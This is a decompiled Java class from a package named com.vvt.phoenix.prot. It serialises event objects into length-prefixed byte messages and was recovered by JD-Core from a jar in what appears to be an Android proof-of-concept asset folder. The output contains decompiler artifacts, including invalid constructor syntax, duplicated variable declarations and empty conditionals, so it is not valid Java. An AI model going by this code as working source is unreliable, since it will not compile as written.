package com.vvt.phoenix.prot.a;

import com.vvt.phoenix.prot.event.b;
import com.vvt.phoenix.prot.event.s;
import java.io.ByteArrayOutputStream;

public class a
{
  private static final boolean a;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.b;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  public static byte[] a(b paramb)
  {
    boolean bool = a;
    if (bool) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    try
    {
      long l = paramb.a();
      int i = (int)l;
      Object localObject1 = com.vvt.phoenix.a.a.a(i);
      int j = 4;
      localByteArrayOutputStream.write((byte[])localObject1, 0, j);
      localObject1 = paramb.b();
      com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
      localObject1 = localByteArrayOutputStream.toByteArray();
      return (byte[])localObject1;
    }
    finally
    {
      com.vvt.io.d.a(localByteArrayOutputStream);
    }
  }
  
  public static byte[] a(s params)
  {
    boolean bool = a;
    if (bool) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    for (;;)
    {
      int i;
      try
      {
        long l = params.a();
        i = (int)l;
        Object localObject1 = com.vvt.phoenix.a.a.a(i);
        j = 0;
        arrayOfByte2 = null;
        k = 4;
        localByteArrayOutputStream.write((byte[])localObject1, 0, k);
        localObject1 = params.b();
        com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
        i = params.c();
        localByteArrayOutputStream.write(i);
        localObject1 = params.d();
        com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
        localObject1 = params.e();
        com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
        localObject1 = params.f();
        com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
        localObject1 = params.g();
        com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
        localObject1 = params.h();
        com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
        localObject1 = params.i();
        com.vvt.phoenix.a.d.a((String)localObject1, localByteArrayOutputStream);
        localObject1 = params.j();
        com.vvt.phoenix.a.d.b((String)localObject1, localByteArrayOutputStream);
        localObject1 = params.k();
        if (localObject1 != null)
        {
          j = localObject1.length;
          arrayOfByte2 = com.vvt.phoenix.a.a.a(j);
          k = 0;
          int m = 4;
          localByteArrayOutputStream.write(arrayOfByte2, 0, m);
          j = 0;
          arrayOfByte2 = null;
          k = localObject1.length;
          localByteArrayOutputStream.write((byte[])localObject1, 0, k);
          localObject1 = params.l();
          if (localObject1 != null)
          {
            j = localObject1.length;
            arrayOfByte2 = com.vvt.phoenix.a.a.a(j);
            k = 0;
            m = 4;
            localByteArrayOutputStream.write(arrayOfByte2, 0, m);
            j = 0;
            arrayOfByte2 = null;
            k = localObject1.length;
            localByteArrayOutputStream.write((byte[])localObject1, 0, k);
            localObject1 = localByteArrayOutputStream.toByteArray();
            return (byte[])localObject1;
          }
        }
        else
        {
          i = 4;
          localObject1 = new byte[i];
          Object tmp292_290 = localObject1;
          Object tmp293_292 = tmp292_290;
          Object tmp293_292 = tmp292_290;
          tmp293_292[0] = 0;
          tmp293_292[1] = 0;
          tmp293_292[2] = 0;
          tmp293_292[3] = 0;
          j = 0;
          arrayOfByte2 = null;
          k = 4;
          localByteArrayOutputStream.write((byte[])localObject1, 0, k);
          continue;
        }
        i = 4;
      }
      finally
      {
        com.vvt.io.d.a(localByteArrayOutputStream);
      }
      byte[] arrayOfByte1 = new byte[i];
      byte[] tmp345_343 = arrayOfByte1;
      byte[] tmp346_345 = tmp345_343;
      byte[] tmp346_345 = tmp345_343;
      tmp346_345[0] = 0;
      tmp346_345[1] = 0;
      tmp346_345[2] = 0;
      tmp346_345[3] = 0;
      int j = 0;
      byte[] arrayOfByte2 = null;
      int k = 4;
      localByteArrayOutputStream.write(arrayOfByte1, 0, k);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */